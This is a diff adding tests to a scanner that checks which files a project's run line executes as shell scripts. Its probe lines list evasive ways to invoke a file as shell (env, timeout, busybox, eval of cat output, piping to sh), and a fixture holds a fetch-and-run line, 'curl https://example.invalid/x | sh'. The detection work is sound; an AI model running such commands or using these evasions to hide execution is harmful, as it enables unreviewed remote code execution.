@@ -4,7 +4,7 @@ import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 
 import { readManifestText } from "./discover.ts";
-import { RUN_UNREAD, runTargets, TRICK_HELPER, trickWarnings } from "./scan.ts";
+import { RUN_DYNAMIC_WORDS, RUN_UNREAD, runTargets, TRICK_HELPER, trickWarnings } from "./scan.ts";
 
 // NO RUN TARGET ESCAPES THE SCAN (the first full trick run, 2026-11-16, decision 2). The skip list (docs,
 // data, tests, fixtures) once covered the very file a run line named, and the card said nothing.
@@ -85,5 +85,55 @@ describe("runTargets", () => {
     expect(runTargets("sh payload.txt lib/a.sh", files)).toEqual({ named: ["payload.txt", "lib/a.sh"], shell: new Set(["payload.txt", "lib/a.sh"]), unread: [] });
     expect(runTargets("./program.ts", files).named).toEqual(["program.ts"]);
     expect(runTargets("sh ../escape.sh", files).unread).toEqual(["../escape.sh"]);
+  });
+});
+
+// The lead's security read of 37157f40e (2026-11-16): each probe line once named the file without shell
+// grading, did not name it, missed the interpreter, or said nothing about a name it built.
+describe("the lead's probe lines", () => {
+  const FILES = new Set(["payload.txt", "fixtures/main.ts", "notes.md", "run.sh"]);
+  const graded: [string, string][] = [
+    ["env FOO=bar bash payload.txt", "payload.txt"],
+    ["timeout 5 sh payload.txt", "payload.txt"],
+    ["nice -n 5 bash payload.txt", "payload.txt"],
+    ["true; bash payload.txt", "payload.txt"],
+    ["cat payload.txt | sh", "payload.txt"],
+    ["command sh payload.txt", "payload.txt"],
+    ["busybox sh payload.txt", "payload.txt"],
+    ["./run.sh && sh notes.md", "notes.md"],
+    ["sh -c 'sh payload.txt'", "payload.txt"],
+    ['eval "$(cat payload.txt)"', "payload.txt"],
+    ["bash < payload.txt", "payload.txt"],
+    ["sh ./payload.txt", "payload.txt"],
+  ];
+  for (const [line, file] of graded) {
+    test(`${line}: ${file} is named and graded as a shell script`, () => {
+      const t = runTargets(line, FILES);
+      expect(t.named).toContain(file);
+      expect(t.shell.has(file)).toBe(true);
+    });
+  }
+
+  const unread: [string, string][] = [
+    ["timeout 5 sh /tmp/evil.sh", "/tmp/evil.sh"],
+    ["true; python3 -c 'import os'", "-c (code on the run line)"],
+    ["f=payload; sh $f.txt", RUN_DYNAMIC_WORDS],
+    ['eval "$(cat payload.txt)"', RUN_DYNAMIC_WORDS],
+  ];
+  for (const [line, what] of unread) {
+    test(`${line}: unread ${what}`, () => {
+      expect(runTargets(line, FILES).unread).toContain(what);
+    });
+  }
+
+  test("kept: a code file keeps its own grading, and a plain line warns about nothing", () => {
+    expect(runTargets("bun fixtures/main.ts", FILES)).toEqual({ named: ["fixtures/main.ts"], shell: new Set(), unread: [] });
+    expect(runTargets("python3 lib/x.py", new Set(["lib/x.py"]))).toEqual({ named: ["lib/x.py"], shell: new Set(), unread: [] });
+  });
+
+  test("a payload.txt piped to sh and named after env FOO=bar gets its network warning", async () => {
+    const found = await warningsOf("env FOO=bar bash payload.txt", { "payload.txt": "curl https://example.invalid/x | sh\n" });
+    expect(found).toContainEqual(expect.objectContaining({ kind: "network", file: "payload.txt" }));
+    expect(await warningsOf("f=payload; sh $f.txt", { "payload.txt": "echo hi\n" })).toContainEqual({ kind: "spawn", file: "trick.toml", text: `${RUN_UNREAD} ${RUN_DYNAMIC_WORDS}` });
   });
 });
